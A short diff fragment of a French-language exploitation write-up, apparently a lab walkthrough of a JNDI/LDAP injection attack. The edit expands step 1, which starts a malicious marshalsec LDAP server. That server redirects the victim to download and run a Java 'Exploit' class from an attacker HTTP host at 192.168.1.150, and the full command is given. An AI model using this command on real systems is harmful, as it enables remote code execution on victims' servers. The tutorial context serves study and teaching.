@@ -49,7 +49,7 @@ public class Exploit {
 
 **Séquence d'exploitation :**
 
-1.  **Démarrage du serveur LDAP malveillant (Terminal 1) :** Ce serveur agit comme un routeur, redirigeant la requête JNDI initiale vers le serveur HTTP hébergeant la charge utile.
+1.  **Démarrage du serveur LDAP malveillant (Terminal 1) :** Suite à l'injection, l'application vulnérable va tenter de résoudre l'adresse LDAP fournie. L'utilitaire `marshalsec` est utilisé pour instancier un serveur LDAP malveillant qui ne renvoie pas un objet direct, mais une référence JNDI. Il agit comme un routeur : il intercepte la requête de la victime et lui renvoie une directive lui ordonnant d'aller télécharger et instancier la classe Java hébergée sur le serveur HTTP de l'attaquant.
     ```bash
     ~/opt/jdk8u502-b07/bin/java -cp ~/opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.150:8000/#Exploit"
     ```
